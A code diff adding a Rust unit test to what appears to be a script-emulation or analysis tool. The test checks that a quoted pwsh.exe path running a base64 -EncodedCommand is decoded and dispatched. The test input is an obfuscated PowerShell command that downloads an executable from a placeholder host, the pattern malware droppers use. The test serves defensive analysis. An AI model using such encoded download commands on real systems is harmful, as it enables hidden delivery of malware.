@@ -8413,6 +8413,31 @@ mod start_tests {
     }
 
     #[test]
+    fn quoted_spaced_powershell_path_dispatches() {
+        use base64::Engine;
+
+        let mut env = Environment::new(&Config::default());
+        let ps = "Invoke-WebRequest https://quoted-spaced-path.example/p.exe";
+        let utf16: Vec<u8> = ps.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
+        interpret_line(
+            &format!(r#""C:\Program Files\PowerShell\7\pwsh.exe" -EncodedCommand {b64}"#),
+            &mut env,
+        );
+        let expected_url_utf16: Vec<u8> = "https://quoted-spaced-path.example/p.exe"
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .collect();
+        assert!(
+            env.exec_ps1.iter().any(|body| body
+                .windows(expected_url_utf16.len())
+                .any(|window| window == expected_url_utf16.as_slice())),
+            "quoted spaced PowerShell path did not dispatch: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
     fn start_empty_title_flag_quoted_cmd_recurses() {
         let mut env = Environment::new(&Config::default());
         interpret_line(r#"start "" /B "cmd.exe" /c echo quoted-start"#, &mut env);
